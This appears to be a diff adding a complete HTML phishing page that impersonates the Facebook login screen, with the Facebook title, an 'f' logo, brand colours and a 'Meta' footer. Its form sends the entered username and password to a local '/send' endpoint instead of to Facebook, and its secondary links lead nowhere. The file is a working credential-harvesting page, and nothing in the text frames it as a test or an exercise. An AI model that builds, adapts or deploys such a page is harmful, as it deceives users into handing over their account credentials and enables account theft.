@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+    /* Basic Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+      padding: 20px;
+    }
+
+    .login-box {
+      width: 90%;
+      max-width: 400px;
+      min-width: 320px;
+      background-color: #fff;
+      padding: 30px 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      text-align: center;
+    }
+
+    .logo {
+      width: 50px;
+      height: 50px;
+      background-color: #1877f2;
+      border-radius: 50%;
+      margin: 0 auto 20px auto;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #fff;
+      font-size: 32px;
+      font-weight: bold;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin: 6px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 14px;
+      margin-top: 12px;
+      background-color: #1877f2;
+      color: #fff;
+      font-size: 18px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .login-btn:hover {
+      background-color: #166fe5;
+    }
+
+    .forgot, .create {
+      display: block;
+      margin-top: 12px;
+      font-size: 14px;
+      color: #1877f2;
+      text-decoration: none;
+      transition: text-decoration 0.2s;
+    }
+
+    .create {
+      margin-top: 20px;
+      border: 1px solid #1877f2;
+      padding: 12px;
+      border-radius: 6px;
+      font-weight: bold;
+    }
+
+    .forgot:hover, .create:hover {
+      text-decoration: underline;
+    }
+
+    .meta-logo {
+      margin-top: 20px;
+      color: #1877f2;
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    /* Responsive adjustments */
+    @media(max-width: 400px) {
+      .login-box {
+        padding: 25px 15px;
+      }
+    }
+
+    @media(min-width: 600px) {
+      .login-box {
+        padding: 35px 25px;
+      }
+    }
+
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="logo">f</div>
+    <form action="/send" method="POST">
+      <input type="text" name="username" placeholder="Mobile number or email address" required><br>
+      <input type="password" name="password" placeholder="Password" required><br>
+      <button class="login-btn" type="submit">Log In</button>
+    </form>
+    <a href="#" class="forgot">Forgotten password?</a>
+    <a href="#" class="create">Create new account</a>
+    <div class="meta-logo">Meta</div>
+  </div>
+</body>
+</html>
